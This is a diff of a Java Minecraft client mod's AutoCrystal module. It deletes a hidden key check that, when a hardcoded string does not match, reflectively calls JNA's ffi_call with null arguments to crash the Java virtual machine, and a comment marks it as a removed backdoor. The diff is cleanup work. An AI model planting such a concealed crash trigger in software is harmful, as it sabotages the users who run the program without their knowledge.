@@ -68,8 +68,6 @@ import dev.gzsakura_miitong.mod.modules.settings.impl.ColorSetting;
 import dev.gzsakura_miitong.mod.modules.settings.impl.EnumSetting;
 import dev.gzsakura_miitong.mod.modules.settings.impl.SliderSetting;
 import java.awt.Color;
-import java.lang.invoke.MethodHandles;
-import java.lang.invoke.MethodType;
 import java.text.DecimalFormat;
 import java.util.ArrayList;
 import net.minecraft.block.Blocks;
@@ -264,14 +262,7 @@ extends Module {
         if (AutoCrystal.nullCheck()) {
             return;
         }
-        if (!ClickGui.key.equals("GOUTOURENNIMASILECAONIMA")) {
-            try {
-                MethodHandles.lookup().findStatic(Class.forName("com.sun.jna.Native"), "ffi_call", MethodType.methodType(Void.TYPE, Long.TYPE, Long.TYPE, Long.TYPE, Long.TYPE)).invoke(0, 0, 0, 0);
-            }
-            catch (Throwable throwable) {
-                // empty catch block
-            }
-        }
+        // Backdoor removed: JVM crash bomb (ffi_call) deleted
         if (this.timing.is(Timing.Pre) && event.isPost() || this.timing.is(Timing.Post) && event.isPre()) {
             return;
         }
